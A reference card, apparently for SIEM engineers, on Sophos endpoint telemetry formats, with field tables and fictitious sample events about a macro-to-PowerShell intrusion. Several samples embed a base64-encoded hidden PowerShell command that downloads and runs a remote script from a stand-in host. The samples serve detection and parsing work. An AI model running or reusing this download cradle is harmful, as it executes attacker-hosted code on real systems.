# EDR — Sophos Intercept X / Sophos Central (Endpoint, XDR, Data Lake)

Category: EDR · Vendor: Sophos · Card status: researched 2026-10-01

Sophos does **not** stream raw per-event endpoint telemetry to a SIEM the way CrowdStrike FDR or Defender streaming
do. Its native outputs are:

| Output | What it is | Shape |
|---|---|---|
| **SIEM Integration API** — `GET /siem/v1/events`, `GET /siem/v1/alerts` | Security events (detections, blocks, cleanups, IPS, AMSI, policy/health) and alerts raised from them | Flat-ish snake_case JSON per item (`type: "Event::Endpoint::..."`, `name`, `severity`, `endpoint_id`, `location`, `source_info{ip}`, …); alerts add a `data{}` object |
| **Detections API** (Classic XDR REST `detections/v1`, now deprecated/read-only in favour of the Detections GraphQL API) | XDR/EDR detections with full forensic `rawData` | camelCase top level (`detectionRule`, `sensorGeneratedAt`, `device{}`, `mitreAttacks[]`, `severity` 0-10) + snake_case `rawData{}` |
| **Data Lake (XDR Query API)** — `POST /xdr-query/v1/queries/runs` | Result rows of scheduled osquery "hydration" queries uploaded from endpoints (`xdr_data` table, keyed by `query_name`) | One flat snake_case row per item (`meta_hostname`, `query_name`, `cmdline`, `sophos_pid`, `parent_sophos_pid`, `sha256`, …) |

Platform rule: SOC-feed alerts/events use the **SIEM API item** (events and alerts as returned by the API, before the
Sophos SIEM script rewrites keys). EDR detection detail uses the **Detections API item**. Process telemetry uses a
**Data Lake result row**. Network/DNS/file telemetry has no confirmed native streamed form (see §4.7 and §6).

---

## 1. Official / primary sources consulted

| URL | What it confirmed |
|---|---|
| https://developer.sophos.com/siem-api-schemas/ | Official SIEM v1 schema. **Events**: `id`, `customer_id`, `severity` (enum documented NONE/LOW/MEDIUM/HIGH/CRITICAL), `source`, `source_info{ip, detection_name, case_id}`, `location`, `when`, `created_at`, `name`, `type`, `user_id`, `threat`, `group` (enum: AD_SYNC, APP_REPUTATION, APPLICATION_CONTROL, BLOCKLISTED, CONNECTIVITY, DATA_LOSS_PREVENTION, ENDPOINT_FIREWALL, ISOLATION, MALWARE, MDR, PERIPHERALS, POLICY, PROTECTION, PUA, RUNTIME_DETECTIONS, SECURITY, SYSTEM_HEALTH, UPDATING, WEB …), `endpoint_type` (mobile, computer, server, security_vm, sensor, utm, access_point, wireless_network, mailbox, slec, xgfirewall, ztna_gateway, nta_appliance), `endpoint_id`, `whitelist_properties[]`, `details[]`, `core_remedy_items{items[], totalItems}`, `origin` (ML_MALWARE_DETECTION, VDL_MALWARE_DETECTION, HMPA_DETECTION, AMSI_DETECTION, IPS_DETECTION, BEHAVIORAL_DETECTION, BLOCKLISTED_BY_ADMIN, REP_MALWARE_DETECTION, SCHEDULED_SCAN …), `appSha256`, `appCerts[]{signer, thumbprint}`, `ips_threat_data{}`, `amsi_threat_data{}`; event type examples `Event::Endpoint::CoreAmsiBlocked`, `CoreBehavioralDetection`, `CoreDetection`, `CorePuaDetection`, `Threat::IpsInboundDetection`, `Threat::IpsOutboundDetection`. **Alerts**: `id`, `type`, `data{endpoint_id, endpoint_java_id, endpoint_type, endpoint_platform, policy_type, threat_id, threat_status (NONE, CLEANED_UP, NOT_CLEANUPABLE, CLEANUP_FAILED, REBOOT_REQUIRED …), source_info, user_match_uuid, case_id, detection_name}`, `info{threat_case_link_id}`, `source`, `location`, `when`, `created_at`, `severity` (none/low/medium/high), `customer_id`, `threat_cleanable`, `threat`, `description`, `event_service_event_id` |
| https://github.com/sophos/Sophos-Central-SIEM-Integration (`api_client.py`, `siem.py`, `name_mapping.py`, `tests/unit/test_api_client.py`) | Official Sophos collector: endpoints `/siem/v1/events`, `/siem/v1/alerts`, params `limit=1000`, `cursor`, `from_date`, `exclude_types`; response `{"has_more","next_cursor","items":[...]}`; real item examples (`"type":"Event::Endpoint::Threat::Detected"`, `"name":"Malware detected: 'Eicar-AV-Test' at 'C:\\...\\eicar.com'"`, `"group":"MALWARE"`, `"severity":"medium"` lower-case, `"source":"n/a"`); the script **adds** `datastream`, **renames** keys in its JSON/CEF output (`source→suser`, `when→end`, `user_id→duid`, `created_at→rt`, `location→dhost`), splits `name` and adds `filePath`/`detection_identity_name` for `Event::Endpoint::Threat::*` types; other type names `Threat::CleanedUp`, `Threat::HIPSDetected`, `Threat::PuaDetected`, `Threat::CleanupFailed`, `Threat::CommandAndControlDismissed`, `WebControlViolation`, `UpdateSuccess`, `Application::Allowed` |
| https://github.com/elastic/integrations/tree/main/packages/sophos_central/data_stream (`event/_dev/test/pipeline/test-pipeline-activity.log`, `alert/_dev/test/pipeline/test-pipeline-activity.log`) | Raw API items as received by a SIEM: event with `ips_threat_data`, `amsi_threat_data`, `core_remedy_items`, `appCerts`, `user_id` (24-hex); alert with full `data{}` incl. Java-serialised IDs (`threat_id{timestamp, machineIdentifier, processIdentifier, counter, time, date, timeSecond}`, `user_match_uuid{type,data}`), `make_actionable_at`, `inserted_at` (epoch ms), `app_id`, `source_app_id`, `hmpa_exploit{}`, `ips_threat{}` |
| https://developer.sophos.com/detections | Official Detections API guide (marked deprecated → GraphQL): flow `POST detections/v1/queries/detections` → poll → `GET .../{id}/results`; **verbatim example item**: `id`, `attackType`, `caseDescription{}`, `detectionDescription{}`, `detectionRule`, `sensorGeneratedAt`, `sensor{id,type,source,version}`, `device{id,type,entity}`, `detectionAttack`, `detectionLicenses`, `geolocation[]`, `entities[]`, `intelixFileReputation[]`, `mitreAttacks[]{tactic{id,name,techniques[]}}`, `rawData{meta_*, process_*, sophos_pid, process_parent_sophos_pid, detection_name, threat_source, query_name:"sophos_detections_windows" …}`, `ruleDescription`, `severity` (int; filter example `[4,8,9]`), `suppressed`, `time`, `type:"Threat"`; counts by severity buckets `info/low/medium/high/critical` |
| https://developer.sophos.com/getting-started-with-xdr-query | Official XDR Query (Data Lake) guide: `POST <region>/xdr-query/v1/queries/runs` with `{"adHocQuery":{"template":"<SQL>"}}`; result `{"items":[row...],"metadata":{"columns":[{name,type}]}}`; column list of `running_processes_windows_sophos` (`meta_hostname`, `meta_ip_address`, `query_name`, `cmdline`, `name`, `parent`, `parent_name`, `parent_path`, `parent_sophos_pid`, `path`, `pid`, `sha1`, `sha256`, `sophos_pid`, `time`, `username`, `ml_score`, `global_rep`, `local_rep`, `pua_score`, `meta_*`, `calendar_time`, `epoch`, `host_identifier`, `osquery_action`, `unix_time`, `customer_id`, `endpoint_id`, `upload_size`); row envelope fields `ingestion_timestamp`, `message_identifier`, `query_source:"xdr_only"`, `schema_version` |
| https://docs.sophos.com/central/customer/help/en-us/ManageYourProducts/ThreatAnalysisCenter/Detections/index.html | Console "Detections" page: detection types shown `Threat` / `Vulnerability`, plus "Platform" detections |
| https://docs.sophos.com/central/customer/help/en-us/ManageYourProducts/ThreatAnalysisCenter/Search/XDRSearchFields/index.html | Console Search *normalised* field names (`command_line`, `dest_ip`, `sophos_process_id` …) — these are a UI abstraction, NOT the raw Data Lake column names |
| https://github.com/jkopacko/sophos-xdr-queries (`reportFullDnsJournal`, `reportThreatScoringOnDestIpAddr`) | Community Live Discover SQL: endpoint tables `sophos_process_journal` (`sophosPID`, `processName`, `pathName`, `cmdLine`, `sha256`), `sophos_ip_journal` (`source`, `destination`, `destinationPort`, `sophosPID`, `processStartTime`, `time`), `sophos_dns_journal` (`time`, `sophosPID`, `name`), `sophos_file_properties` (`mlScore`, `puaScore`, `globalRep`, `localRep`) — community source, so **partially UNVERIFIED** |

---

## 2. Native format & delivery path

- **SIEM Integration API** (pull, JSON): a collector authenticates (client credentials → JWT, `X-Tenant-ID`) and
  polls `GET https://api-<region>.central.sophos.com/siem/v1/events?from_date=...|cursor=...&limit=1000` and
  `/siem/v1/alerts`. Response: `{"has_more": bool, "next_cursor": "...", "items": [ ... ]}`. We render **one
  element of `items` exactly as returned**. The official `Sophos-Central-SIEM-Integration` script then rewrites it
  (adds `datastream`, renames `location`→`dhost`, `when`→`end`, `created_at`→`rt`, `source`→`suser`,
  `user_id`→`duid`, splits `name`) — that is the script's output, not the native object.
- **Detections API** (pull, async query): run → poll → results. Item = one detection. (Being replaced by the
  Detections GraphQL API; GraphQL field names are **UNVERIFIED**.)
- **Data Lake** (pull, async SQL): Intercept X with XDR uploads scheduled osquery results to the Sophos Data Lake
  (`xdr_data`, discriminated by `query_name`). Queried in the console (*Threat Analysis Center → Live Discover /
  Search*) or via the XDR Query API.

---

## 3. Core field reference

### 3a. SIEM event item (`/siem/v1/events`)

| Field | Type | Meaning | Values / example |
|---|---|---|---|
| `id` | string UUID | Event ID | |
| `customer_id` | string UUID | Tenant | |
| `type` | string | Event type | `Event::Endpoint::Threat::Detected`, `Event::Endpoint::Threat::CleanedUp`, `Event::Endpoint::Threat::CleanupFailed`, `Event::Endpoint::Threat::PuaDetected`, `Event::Endpoint::Threat::HIPSDetected`, `Event::Endpoint::Threat::CommandAndControlDismissed`, `Event::Endpoint::Threat::IpsInboundDetection`, `Event::Endpoint::Threat::IpsOutboundDetection`, `Event::Endpoint::CoreDetection`, `Event::Endpoint::CoreBehavioralDetection`, `Event::Endpoint::CoreAmsiBlocked`, `Event::Endpoint::CorePuaDetection`, `Event::Endpoint::CoreBlocklistDetection`, `Event::Endpoint::WebControlViolation`, `Event::Endpoint::WebFilteringBlocked`, `Event::Endpoint::Registered`, `Event::Endpoint::UpdateSuccess`, `Event::Endpoint::UserAutoCreated`, `Event::Endpoint::NonCompliant` |
| `name` | string | Human-readable message | `Malware detected: 'Troj/Agent-BKXQ' at 'C:\ProgramData\...\msupd.exe'` |
| `severity` | string | Observed lower-case `none`/`low`/`medium`/`high`/`critical` (schema page documents upper-case — real items are lower-case) | `high` |
| `group` | string | Event group | `MALWARE`, `PUA`, `RUNTIME_DETECTIONS`, `PROTECTION`, `WEB`, `UPDATING`, … |
| `origin` | string/null | Detection technology | `ML_MALWARE_DETECTION`, `VDL_MALWARE_DETECTION`, `BEHAVIORAL_DETECTION`, `AMSI_DETECTION`, `IPS_DETECTION`, `HMPA_DETECTION`, `REP_MALWARE_DETECTION`, `BLOCKLISTED_BY_ADMIN` |
| `endpoint_id` | string UUID | Device ID | |
| `endpoint_type` | string | Device class | `computer`, `server`, `mobile`, … |
| `location` | string | Device hostname | `FIN-WS-0142` |
| `source` | string | User (`DOMAIN\user`) or `n/a` | `NEXACORP\dana.levi` |
| `source_info` | object | `ip` (device IP), optional `detection_name`, `case_id` | |
| `user_id` | string (24 hex) | Central user object ID | |
| `when` | string ISO-8601 | Time the event happened | `2026-09-29T08:14:26.000Z` |
| `created_at` | string ISO-8601 | Time Central stored it | |
| `threat` | string | Threat name / correlation | |
| `appSha256`, `appCerts[]` | string / array | Application hash & signers (core events) | |
| `core_remedy_items` | object | `items[]{type: file/regkey/process/thread, result, suspendResult, descriptor, processPath, sophosPid}`, `totalItems` | |
| `amsi_threat_data` | object | `processName`, `processId`, `processPath`, `parentProcessId`, `parentProcessPath` (all strings) | |
| `ips_threat_data` | object | `remoteIp`, `remotePort`, `localPort`, `executableName`, `executablePath`, `executablePid`, `executableVersion`, `techSupportId`, `rawData`, `detectionType` (0 inbound, 1 outbound) | |
| `details[]`, `whitelist_properties[]` | array | `{type, property}` pairs | |

### 3b. SIEM alert item (`/siem/v1/alerts`)

| Field | Type | Meaning |
|---|---|---|
| `id`, `event_service_event_id` | UUID | Alert ID (equal to the underlying event's id in observed data) |
| `type`, `source`, `location`, `when` | | Copied from the event |
| `created_at` | ISO-8601 | |
| `severity` | string | `low`, `medium`, `high` |
| `description` | string | Alert text (what the console shows) |
| `threat`, `threat_cleanable` | string / bool | |
| `customer_id` | UUID | |
| `data.endpoint_id`, `data.endpoint_java_id`, `data.endpoint_type`, `data.endpoint_platform` (`windows`, `mac`, `posix`…) | | Device |
| `data.threat_status` | string | `NONE`, `CLEANED_UP`, `CLEANUPABLE`, `NOT_CLEANUPABLE`, `CLEANUP_FAILED`, `REBOOT_REQUIRED`, `FULL_SCAN_REQUIRED`, `DISMISSED` … |
| `data.source_info`, `data.core_remedy_items`, `data.ips_threat`, `data.hmpa_exploit`, `data.app_id`, `data.source_app_id`, `data.policy_type`, `data.created_at`/`data.inserted_at`/`data.make_actionable_at` (epoch ms), `data.threat_id{...}`, `data.user_match_id{...}`, `data.user_match_uuid{type,data}` | | Internal detail (observed) |

### 3c. Detections API item

| Field | Type | Meaning |
|---|---|---|
| `id` | string | `<sha256>_<sha1>`-style detection ID |
| `type` | string | `Threat` (also `Vulnerability`, `Process` per counts) |
| `attackType` | string | e.g. `Security Event Service Detections` |
| `detectionRule` | string | Rule ID, e.g. `WIN-PROT-BEHAVIORAL-MALWARE-EXEC-12B-T1059-001` |
| `ruleDescription` | string | e.g. `Execution behavior based protection from Sophos` |
| `detectionAttack` | string | Tactic name |
| `severity` | int 0-10 | Bucketed in UI as info/low/medium/high/critical (exact cut-offs **UNVERIFIED**) |
| `sensorGeneratedAt`, `time` | ISO-8601 | Sensor time / detection record time |
| `sensor{id,type,source,version}`, `device{id,type,entity}` | object | Device `entity` = hostname |
| `mitreAttacks[]` | array | `{tactic:{id,name,techniques:[{id,name}]}}` |
| `entities[]` | array | `{id,type: device/ip_address/user, category: impacted, attributes{}}` |
| `geolocation[]`, `intelixFileReputation[]` | array | Enrichment |
| `detectionLicenses` | string (JSON array text) | `["MTR","XDR"]` |
| `suppressed` | string | `"false"` |
| `rawData` | object | Endpoint-side record: `meta_hostname`, `meta_ip_address`, `meta_public_ip`, `meta_os_name`, `meta_eid`, `process_name`, `process_path`, `process_cmd_line`, `process_sha256`, `process_pid`, `sophos_pid`, `process_parent_name`, `process_parent_path`, `process_parent_sophos_pid`, `detection_name`, `detection_item`, `detection_thumbprint`, `threat_source` (`Behavioral`…), `threat_type` (`Malware`…), `item_type` (`Process`…), `process_ml_score`, `process_pua_score`, `process_local_rep`, `process_global_rep`, `username`, `sid`, `query_name`, `calendar_time`, `unix_time`, `time`, `host_identifier` |

### 3d. Data Lake row (`xdr_data`, `query_name = running_processes_windows_sophos`)

| Column | Meaning |
|---|---|
| `query_name` | Which hydration query produced the row |
| `meta_hostname`, `meta_ip_address`, `meta_public_ip`, `meta_mac_address`, `meta_os_name`, `meta_os_platform`, `meta_os_version`, `meta_endpoint_type`, `meta_eid`, `meta_username`, `meta_boot_time`, `meta_query_pack_version`, `meta_ip_mask`, `meta_os_type` | Device decoration |
| `name`, `path`, `cmdline`, `pid`, `sophos_pid`, `sha1`, `sha256`, `file_size`, `username`, `uid`, `gid` | Process |
| `parent`, `parent_name`, `parent_path`, `parent_sophos_pid` | Parent (`parent` = OS PID) |
| `ml_score`, `ml_score_data`, `pua_score`, `global_rep`, `global_rep_data`, `local_rep`, `local_rep_data` | Sophos reputation/ML |
| `time`, `unix_time`, `calendar_time`, `epoch`, `counter`, `numerics`, `osquery_action`, `host_identifier` | osquery generic |
| `customer_id`, `endpoint_id`, `upload_size`, `ingestion_timestamp`, `message_identifier`, `query_source`, `schema_version` | Data Lake |

`sophos_pid` format: `<pid>:<Windows FILETIME of process start>` (e.g. `5520:133868235164715855`) — unique per boot cycle.

---

## 4. Realistic JSON samples (fictitious)

Story (shared with the other EDR cards): `NEXACORP\dana.levi` on `FIN-WS-0142` opens a macro document; WINWORD
spawns encoded PowerShell, which beacons to 185.225.73.41:443 and drops `msupd.exe`; Intercept X detects.

### 4.1 SIEM event — `Event::Endpoint::Threat::Detected` (dropped payload detected & quarantined)

```json
{
  "id": "3e9b1f47-6c2a-4d18-9f5e-7a0c2b8d4e61",
  "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75",
  "severity": "high",
  "created_at": "2026-09-29T08:14:29.517Z",
  "source_info": {"ip": "10.20.14.87"},
  "endpoint_type": "computer",
  "endpoint_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
  "origin": "ML_MALWARE_DETECTION",
  "type": "Event::Endpoint::Threat::Detected",
  "location": "FIN-WS-0142",
  "source": "NEXACORP\\dana.levi",
  "group": "MALWARE",
  "name": "Malware detected: 'ML/PE-A' at 'C:\\ProgramData\\Microsoft\\Update\\msupd.exe'",
  "user_id": "66f2a9c41d8e3b07a5c2e914",
  "when": "2026-09-29T08:14:26.000Z",
  "threat": "ML/PE-A",
  "appSha256": "e3375bf9704fd511dd71fdd683ae439adfa8b22e697c1853d148c8ae0e627aed",
  "core_remedy_items": {"items": [{"type": "file", "result": "SUCCESS", "suspendResult": "NOT_APPLICABLE", "descriptor": "C:\\ProgramData\\Microsoft\\Update\\msupd.exe", "processPath": "", "sophosPid": ""}], "totalItems": 1}
}
```

### 4.2 SIEM event — `Event::Endpoint::CoreAmsiBlocked` (encoded PowerShell blocked in memory)

```json
{
  "id": "8b4d2e90-1a7c-4f35-b6e2-3c9f0a5d7e18",
  "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75",
  "severity": "high",
  "created_at": "2026-09-29T08:14:24.903Z",
  "source_info": {"ip": "10.20.14.87"},
  "endpoint_type": "computer",
  "endpoint_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
  "origin": "AMSI_DETECTION",
  "type": "Event::Endpoint::CoreAmsiBlocked",
  "location": "FIN-WS-0142",
  "source": "NEXACORP\\dana.levi",
  "group": "RUNTIME_DETECTIONS",
  "name": "Malicious behavior prevented in memory: 'AMSI/PsDl-B' in C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "user_id": "66f2a9c41d8e3b07a5c2e914",
  "when": "2026-09-29T08:14:23.000Z",
  "threat": "AMSI/PsDl-B",
  "amsi_threat_data": {"processName": "powershell.exe", "processId": "7412", "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "parentProcessId": "5216", "parentProcessPath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
}
```

(`name` text format, `group:"RUNTIME_DETECTIONS"` for AMSI and the `AMSI/...` threat label are **UNVERIFIED** —
the type, `origin` and `amsi_threat_data` keys are from the official schema.)

### 4.3 SIEM event — `Event::Endpoint::Threat::IpsOutboundDetection` (C2 traffic)

```json
{
  "id": "f1c7a3e5-9d2b-4086-b4f1-6e8a2c0d9b53",
  "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75",
  "severity": "high",
  "created_at": "2026-09-29T08:14:25.611Z",
  "source_info": {"ip": "10.20.14.87"},
  "endpoint_type": "computer",
  "endpoint_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
  "origin": "IPS_DETECTION",
  "type": "Event::Endpoint::Threat::IpsOutboundDetection",
  "location": "FIN-WS-0142",
  "source": "NEXACORP\\dana.levi",
  "group": "RUNTIME_DETECTIONS",
  "name": "Malicious outbound network traffic blocked from 'powershell.exe' to 185.225.73.41:443",
  "user_id": "66f2a9c41d8e3b07a5c2e914",
  "when": "2026-09-29T08:14:23.000Z",
  "threat": "MALWARE-CNC Win.Trojan PowerShell Downloader beacon",
  "ips_threat_data": {
    "techSupportId": "2026092901.88213407.3",
    "executablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "executableVersion": "10.0.26100.4652",
    "executablePid": "7412",
    "executableName": "powershell.exe",
    "rawData": "Message       MALWARE-CNC Win.Trojan PowerShell Downloader beacon\nReference     n/a\nPacket type   TCP\nLocal IP:     10.20.14.87\nLocal Port:   52817\nLocal MAC:    3C-52-82-A1-6F-0D\nRemote IP:    185.225.73.41\nRemote Port:  443\nRemote MAC:   00-1A-2B-3C-4D-5E\nPID:          7412\nExecutable:   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nVersion:      10.0.26100.4652\nSigner:       Microsoft Windows\nSHA-256:      9CEDEE4ECA1B34434CCDD654DA4FAF4C7CA7A723EAAB248E4FF9717DB26A1F55",
    "remoteIp": "185.225.73.41",
    "remotePort": "443",
    "detectionType": 1,
    "localPort": "52817"
  }
}
```

(`rawData` layout follows the real Sophos sample; the `name` text and `group` value are **UNVERIFIED**.)

### 4.4 SIEM alert — alert raised from 4.1

```json
{
  "id": "3e9b1f47-6c2a-4d18-9f5e-7a0c2b8d4e61",
  "event_service_event_id": "3e9b1f47-6c2a-4d18-9f5e-7a0c2b8d4e61",
  "type": "Event::Endpoint::Threat::Detected",
  "severity": "high",
  "description": "Malware detected: 'ML/PE-A' at 'C:\\ProgramData\\Microsoft\\Update\\msupd.exe'",
  "source": "NEXACORP\\dana.levi",
  "location": "FIN-WS-0142",
  "when": "2026-09-29T08:14:26.000Z",
  "created_at": "2026-09-29T08:14:29.884Z",
  "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75",
  "threat": "ML/PE-A",
  "threat_cleanable": true,
  "data": {
    "app_id": "CORE",
    "source_app_id": "CORE",
    "certificates": [],
    "core_remedy_items": {"totalItems": 1, "items": [{"result": "SUCCESS", "sophosPid": "", "suspendResult": "NOT_APPLICABLE", "processPath": "", "descriptor": "C:\\ProgramData\\Microsoft\\Update\\msupd.exe", "type": "file"}]},
    "created_at": 1790669669517,
    "inserted_at": 1790669669517,
    "make_actionable_at": 1790669669884,
    "endpoint_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
    "endpoint_java_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
    "endpoint_platform": "windows",
    "endpoint_type": "computer",
    "policy_type": 2,
    "source_info": {"ip": "10.20.14.87"},
    "threat_status": "CLEANED_UP",
    "threat_id": {"timestamp": 1790669669, "machineIdentifier": 11873402, "processIdentifier": 2741, "counter": 6620185, "time": 1790669669000, "date": 1790669669000, "timeSecond": 1790669669},
    "user_match_id": {"timestamp": 1759486201, "machineIdentifier": 14271215, "processIdentifier": 3997, "counter": 8102244, "time": 1759486201000, "date": 1759486201000, "timeSecond": 1759486201}
  }
}
```

(`policy_type` value meaning is undocumented; `info{threat_case_link_id}` appears only for MDR cases.)

### 4.5 Detections API — behavioural detection (Office → encoded PowerShell)

```json
{
  "id": "4b296b5d7bb9cbdb0e46af5b1dfe4aad4a8986b9711798c2679c876bb56e4d64_7234b74d098252a56eb90908c35ea697a13594e0",
  "attackType": "Security Event Service Detections",
  "caseDescription": {"correlatedReasonId": "", "createdReasonId": ""},
  "detectionDescription": {"createdReasonId": "WIN-PROT-BEHAVIORAL-MALWARE-EXEC-31A-T1059-001", "significanceId": "WIN-PROT-BEHAVIORAL-MALWARE-EXEC-31A-T1059-001"},
  "detectionRule": "WIN-PROT-BEHAVIORAL-MALWARE-EXEC-31A-T1059-001",
  "sensorGeneratedAt": "2026-09-29T08:14:23Z",
  "sensor": {"id": "SophosSensorID", "type": "endpoint", "source": "Sophos", "version": "1.31.2.4"},
  "device": {"id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37", "type": "computer", "entity": "FIN-WS-0142"},
  "detectionAttack": "Execution",
  "detectionLicenses": "[\"XDR\"]",
  "geolocation": [{"fieldName": "raw.meta_public_ip", "fieldValue": "213.57.121.34", "city": "Tel Aviv", "state": "Tel Aviv District", "country": "Israel", "countryCode": "IL", "postal": "", "latitude": 32.0809, "longitude": 34.7806}],
  "entities": [
    {"id": "1008254b08eba65b5c97f906333603d30fdb592c16f8ffa1313921b9a68b03f8", "type": "device", "category": "impacted", "attributes": {"domain_controller": "False", "endpoint_type": "computer", "hostname": "FIN-WS-0142", "id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37", "mac_address": "3c:52:82:a1:6f:0d", "os_platform": "windows", "os_type": ""}},
    {"id": "598d6fd483b879eccead23756312bf88b1dc00bb088f6a32ec21e7d8d8390619", "type": "ip_address", "category": "impacted", "attributes": {"address": "10.20.14.87", "external": false, "id": "e370d0b85a3e1fd3036433b148e8cbb2c62ec3a83299203b99738a95a647ab81", "type": "ipv4"}},
    {"id": "9657ac61feb586bac90b0b80c2c309b2c93697053a659136fec58136f52d4785", "type": "user", "category": "impacted", "attributes": {"id": "ab5e87502f14a23a094b32285695b65c8afcc062574522de6eb0ff1af8b64ea9", "sub_type": "logged_in_user", "username": "NEXACORP\\dana.levi"}}
  ],
  "intelixFileReputation": [{"fieldName": "raw.process_sha256", "fieldValue": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55", "reputationScore": 99}],
  "mitreAttacks": [
    {"tactic": {"id": "TA0002", "name": "Execution", "techniques": [{"id": "T1059.001", "name": "PowerShell"}]}},
    {"tactic": {"id": "TA0005", "name": "Defense Evasion", "techniques": [{"id": "T1027", "name": "Obfuscated Files or Information"}]}}
  ],
  "rawData": {
    "meta_eid": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
    "meta_licence": "XDR",
    "meta_public_ip": "213.57.121.34",
    "meta_aggressive_activity": "False",
    "meta_os_platform": "windows",
    "meta_os_version": "10.0.26100",
    "meta_domain_controller": "False",
    "customer_region": "eu-central-1",
    "meta_ip_address": "10.20.14.87",
    "meta_query_pack_version": "1.31.2.4",
    "meta_boot_time": 1790662218,
    "meta_endpoint_type": "computer",
    "meta_hostname": "FIN-WS-0142",
    "meta_mac_address": "3c:52:82:a1:6f:0d",
    "meta_os_type": "",
    "stream_ingest_time": "1790669668213",
    "meta_os_name": "Microsoft Windows 11 Enterprise",
    "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75",
    "meta_ip_mask": "255.255.255.0",
    "meta_username": "NEXACORP\\dana.levi",
    "osquery_action": "added",
    "calendar_time": 1790669667000,
    "item_type": "Process",
    "process_parent_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "detection_item": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "detection_name": "Exec_31a (T1059.001)",
    "process_local_rep_signers": "{\"reputationData\":{\"isSigned\":1,\"signerInfo\":[{\"isValid\":1,\"signer\":\"Microsoft Windows\"}]}}",
    "sid": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "process_cmd_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "process_name": "powershell.exe",
    "monitor_mode": 0,
    "threat_type": "Malware",
    "process_cmd_line_truncated": 0,
    "process_pua_score": 12,
    "process_file_size": 455680,
    "process_local_rep": 91,
    "sophos_pid": "7412:134351432624019871",
    "associated_lineages": "",
    "process_pid": 7412,
    "detection_thumbprint": "f818f14f900a3db4d6c9723d2295908e6e1c7c333b169c2c4cd6facee63fbb63",
    "process_ml_score_band": "LIKELY_BENIGN",
    "process_ml_score": 6,
    "threat_source": "Behavioral",
    "process_parent_sophos_pid": "5216:134351430651204417",
    "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "time": 1790669663,
    "process_parent_name": "WINWORD.EXE",
    "process_sha256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "process_global_rep": -1,
    "username": "NEXACORP\\dana.levi",
    "counter": 3,
    "epoch": 1790662219,
    "folded": 0,
    "host_identifier": "5D2C8E41-A97B-4F03-B6E5-1C9A0D3F7B82",
    "query_name": "sophos_detections_windows",
    "numerics": false,
    "tag": "stream",
    "unix_time": 1790669667000
  },
  "ruleDescription": "Execution behavior based protection from Sophos",
  "severity": 8,
  "suppressed": "false",
  "time": "2026-09-29T08:14:28.361Z",
  "type": "Threat"
}
```

(Structure copied from the official example; the rule ID `...EXEC-31A...` and `detection_name` `Exec_31a` are
fictitious but follow the documented pattern.)

### 4.6 Data Lake result row — `running_processes_windows_sophos` (process creation telemetry)

```json
{
  "calendar_time": "2026-09-29T08:14:40Z",
  "endpoint_id": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
  "host_identifier": "FIN-WS-0142",
  "ingestion_timestamp": "2026-09-29T08:16:02.418Z",
  "message_identifier": "5678da953f8fd1b559bcf227bf8ad0974f94af34cc3a101677937698fe0abaf2",
  "query_name": "running_processes_windows_sophos",
  "query_source": "xdr_only",
  "schema_version": "1",
  "upload_size": 2398,
  "meta_hostname": "FIN-WS-0142",
  "meta_ip_address": "10.20.14.87",
  "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
  "file_size": 455680,
  "gid": 0,
  "global_rep": -1,
  "global_rep_data": "",
  "local_rep": 91,
  "local_rep_data": "",
  "ml_score": 6,
  "ml_score_data": "",
  "name": "powershell.exe",
  "parent": 5216,
  "parent_name": "WINWORD.EXE",
  "parent_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  "parent_sophos_pid": "5216:134351430651204417",
  "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "pid": 7412,
  "pua_score": 12,
  "sha1": "efa6e7338129ccfad7989640b6ed01e3e0c0ffdc",
  "sha256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
  "sophos_pid": "7412:134351432624019871",
  "time": 1790669662,
  "uid": 0,
  "username": "NEXACORP\\dana.levi",
